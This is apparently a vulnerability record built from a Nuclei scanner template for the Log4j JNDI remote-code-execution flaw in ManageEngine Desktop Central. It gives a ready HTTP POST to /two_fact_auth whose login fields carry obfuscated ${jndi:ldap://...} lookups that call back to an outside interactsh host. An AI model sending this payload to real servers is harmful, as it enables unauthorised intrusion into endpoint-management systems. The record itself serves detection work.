# Vulnerability: Manage Engine Desktop Central - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`manage-engine-dc-log4j-rce.yaml`)

## Description
Manage Engine Endpoint Central (formerly Desktop Central) is susceptible to Log4j JNDI remote code execution. Endpoint Central is a Unified Endpoint Management (UEM) & Endpoint protection suite that helps manage and secure various network devices

## Vulnerable Code Pattern / Exploit Payload
```http
POST /two_fact_auth HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/configurations
Content-Type: application/x-www-form-urlencoded

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&j_password=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&otpTimeout=7&browserLocale=en_us&cacheNum=4&csrfPreventionSaltForFlashMessage=
```

